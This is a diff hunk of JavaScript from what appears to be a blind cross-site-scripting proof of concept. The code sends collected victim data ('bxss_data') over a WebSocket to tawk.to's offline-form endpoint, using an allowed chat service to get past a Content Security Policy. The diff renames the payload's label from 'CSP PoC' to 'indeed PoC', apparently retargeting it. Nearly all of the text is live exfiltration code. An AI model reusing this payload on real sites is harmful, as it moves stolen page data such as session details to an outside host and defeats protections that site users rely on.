@@ -45,7 +45,7 @@ fetch(`https://va.tawk.to/register/${timestamp}`, {
         ws.send('5');
         for (var key in bxss_data) {
           var value = bxss_data[key];
-          ws.send('4' + JSON.stringify({"c":"service","cb":0,"p":["visitor-chat","/v1/visitor/offline-form",{"questions":[{"label":"Submitted From","answer":`https://tawk.to/chat/${api_key}/default`},{"label":"Name","answer":"CSP PoC"},{"label":"Email","answer":"test@example.com"},{"label":"Message","answer": `${key}: ${JSON.stringify(value)}`}],"name":"CSP PoC","email":"test@example.com"}]}));
+          ws.send('4' + JSON.stringify({"c":"service","cb":0,"p":["visitor-chat","/v1/visitor/offline-form",{"questions":[{"label":"Submitted From","answer":`https://tawk.to/chat/${api_key}/default`},{"label":"Name","answer":"indeed PoC"},{"label":"Email","answer":"test@example.com"},{"label":"Message","answer": `${key}: ${JSON.stringify(value)}`}],"name":"indeed PoC","email":"test@example.com"}]}));
         }
         alert(JSON.stringify(bxss_data));
       }
